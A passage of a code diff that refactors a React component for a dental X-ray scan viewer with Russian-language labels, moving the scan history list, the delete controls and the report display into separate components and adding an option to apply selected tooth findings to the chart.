-										paddingRight: "4px",
-									}}
+							onToggleSelectAll={() => {
+								const allCodes = toothStatesArray.map((t) => t.code);
+								if (selectedFindingCodes.size === allCodes.length) setSelectedFindingCodes(new Set());
+								else setSelectedFindingCodes(new Set(allCodes));
+							}}
+							applyButton={
+								<button
+									type="button"
+									data-testid="btn-apply-findings-to-chart"
+									onClick={handleApplyFindingsToChart}
+									disabled={isApplyingToChart}
+									style={getApplyChartButtonStyle(isApplyingToChart)}
 								>
-									{deleteFailure && (
-										<div
-											role="alert"
-											data-testid="xray-scan-delete-failure"
-											style={{
-												padding: "8px 12px",
-												background: "var(--warn-bg)",
-												color: "var(--warn-fg)",
-												borderRadius: "8px",
-												fontSize: "0.82rem",
-												display: "flex",
-												gap: "8px",
-												alignItems: "flex-start",
-											}}
-										>
-											<AlertTriangle
-												size={14}
-												style={{ flexShrink: 0, marginTop: "2px" }}
-												aria-hidden="true"
-											/>
-											<span>{deleteFailure}</span>
-										</div>
+									{isApplyingToChart ? (
+										<>
+											<Loader2 size={14} className="animate-spin" />
+											<span>Внесение...</span>
+										</>
+									) : (
+										<>
+											<CheckCircle2 size={14} />
+											<span>Применить выбранные к формуле ({selectedFindingCodes.size})</span>
+										</>
 									)}
-									{(scanHistory ?? []).map((scan) => (
-										<div
-											key={scan.id}
-											data-testid={`xray-scan-history-row-${scan.id}`}
-											style={{
-												display: "flex",
-												alignItems: "stretch",
-												gap: "6px",
-											}}
-										>
-											<button
-												type="button"
-												onClick={() => loadHistoryScan(scan)}
-												data-testid={`xray-scan-open-${scan.id}`}
-												style={{
-													flex: 1,
-													display: "flex",
-													alignItems: "center",
-													gap: "10px",
-													padding: "10px 12px",
-													borderRadius: "8px",
-													border: "1px solid var(--line)",
-													background: "var(--paper-soft)",
-													cursor: "pointer",
-													textAlign: "left",
-													transition: "all 0.15s",
-													minWidth: 0,
-												}}
-											>
-												<div
-													style={{
-														width: "36px",
-														height: "36px",
-														borderRadius: "6px",
-														background: "var(--paper)",
-														display: "flex",
-														alignItems: "center",
-														justifyContent: "center",
-														border: "1px solid var(--line)",
-														flexShrink: 0,
-													}}
-												>
-													<ScanLine
-														size={16}
-														style={{ color: "var(--teal)" }}
-													/>
-												</div>
-												<div style={{ flex: 1, minWidth: 0 }}>
-													<div
-														className="truncate min-w-0"
-														style={{
-															fontWeight: 600,
-															fontSize: "0.85rem",
-															color: "var(--ink)",
-														}}
-														title={scan.originalFilename ?? "Снимок"}
-													>
-														{scan.originalFilename ?? "Снимок"}
-													</div>
-													<div
-														className="truncate min-w-0"
-														style={{
-															fontSize: "0.78rem",
-															color: "var(--muted)",
-															marginTop: "2px",
-														}}
-													>
-														{new Date(scan.capturedAt).toLocaleDateString(
-															"ru-RU",
-														)}{" "}
-														·{" "}
-														{scan?.aiToothStates
-															? Object.keys(scan.aiToothStates).length
-															: 0}{" "}
-														зубов
-														{scan.aiSummary && (
-															<span title={scan.aiSummary}> · {scan.aiSummary.substring(0, 60)}…</span>
-														)}
-													</div>
-												</div>
-												<ZoomIn
-													size={14}
-													style={{ color: "var(--muted)", flexShrink: 0 }}
-												/>
-											</button>
-											<button
-												type="button"
-												data-testid={`xray-scan-delete-${scan.id}`}
-												aria-label={`Удалить снимок ${scan.originalFilename ?? scan.id}`}
-												title="Удалить из архива"
-												disabled={deletingScanId === scan.id}
-												onClick={(e) => {
-													e.preventDefault();
-													e.stopPropagation();
-													void deleteScan(scan);
-												}}
-												style={{
-													width: "32px",
-													height: "32px",
-													minHeight: "32px",
-													flexShrink: 0,
-													borderRadius: "6px",
-													border: "1px solid var(--line)",
-													background: "var(--paper)",
-													color:
-														deletingScanId === scan.id
-															? "var(--muted)"
-															: "var(--rust, #c62828)",
-													cursor:
-														deletingScanId === scan.id ? "wait" : "pointer",
-													display: "flex",
-													alignItems: "center",
-													justifyContent: "center",
-												}}
-											>
-												{deletingScanId === scan.id ? (
-													<Loader2
-														size={14}
-														className="animate-spin"
-														aria-hidden="true"
-													/>
-												) : (
-													<Trash2 size={14} aria-hidden="true" />
-												)}
-											</button>
-										</div>
-									))}
-								</div>
-							)}
-						</div>
-					)}
-				</div>
+								</button>
+							}
+						/>
+
+						{/* Full report */}
+						{currentScan?.aiReport && (
+							<VisiographReportViewer
+								report={currentScan.aiReport}
+								capturedAt={currentScan.capturedAt}
+							/>
+						)}
+
+						{/* Actions */}
+						<VisiographBottomActions
+							isHistoryView={isHistoryView}
+							currentScan={currentScan}
+							deletingScanId={deletingScanId}
+							onClear={handleClear}
+							onDeleteScan={(s) => void deleteScan(s)}
+						/>
+					</div>
+				)}
+
+				{/* History Drawer */}
+				<VisiographHistoryDrawer
+					scanHistory={scanHistory as XrayHistoryItem[]}
+					isLoadingHistory={isLoadingHistory}
+					historyFailure={historyFailure}
+					historyPhase={historyPhase}
+					effectivePatientId={effectivePatientId}
+					onLoadHistoryScan={(s) => void loadHistoryScan(s as XrayScan)}
+					onDeleteScan={(s) => void deleteScan(s as XrayScan)}
+					deletingScanId={deletingScanId}
+					deleteFailure={deleteFailure}
+					onRetry={() => effectivePatientId && loadHistory(effectivePatientId)}
+				/>
 			</div>
+		</div>
 	);
-}
-
-// ─── Helpers ──────────────────────────────────────────────────────────────────
-
-const STATE_LABELS: Record<string, string> = {
-	treatment: "лечение",
-	planned: "план",
-	watch: "наблюдение",
-	done: "вылечен",
-	missing: "отсутствует",
-};
-
-function extractSummary(report: string): string | null {
-	if (!report) return null;
-	const conclusionMatch = report.match(
-		/\*\*Заключение:\*\*\s*\n([\s\S]*?)(?:\n\n|\*\*|$)/i,
-	);
-	if (conclusionMatch?.[1]) {
-		return conclusionMatch[1]
-			.replace(/^[-*\s]+/gm, "")
-			.trim()
-			.substring(0, 400);
-	}
-	return report.replace(/[*#`]/g, "").substring(0, 200).trim() || null;
 }
